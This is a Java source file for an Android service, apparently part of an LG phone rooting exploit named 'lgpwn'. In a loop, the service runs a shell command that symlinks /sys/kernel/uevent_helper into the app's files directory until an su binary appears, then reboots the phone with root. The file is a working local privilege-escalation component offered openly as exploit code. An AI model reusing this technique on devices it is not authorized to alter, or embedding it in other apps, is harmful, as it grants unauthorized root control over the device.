package com.cunninglogic.lgpwn;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;



public class RootService  extends Service {
	

	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return Service.START_STICKY;
	}
  
	@SuppressLint("SdCardPath")
	@Override
	public void onCreate() {

		
		final File su = new File("/system/xbin/su");
		Thread t = new Thread(new Runnable() {

            public void run() {
            	while (!su.exists()){
        			try {
        				Thread.sleep(1000);
        			} catch (InterruptedException e) {
        				// TODO Auto-generated catch block
        				e.printStackTrace();
        			}
        			exec("ln -s /sys/kernel/uevent_helper /data/data/com.cunninglogic.lgpwn/files/d");
        			
        		}
            	exec("su -c \"reboot\"");
            }
        });
        t.start();
		
		
	
	}
	
	
	
	public static void exec(String cmd){

		try {
			Process process = Runtime.getRuntime().exec("sh");
			DataOutputStream os = new DataOutputStream(process.getOutputStream());
			os.writeBytes(cmd + "\n");
			os.writeBytes("exit\n");
			os.flush();
			
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

}
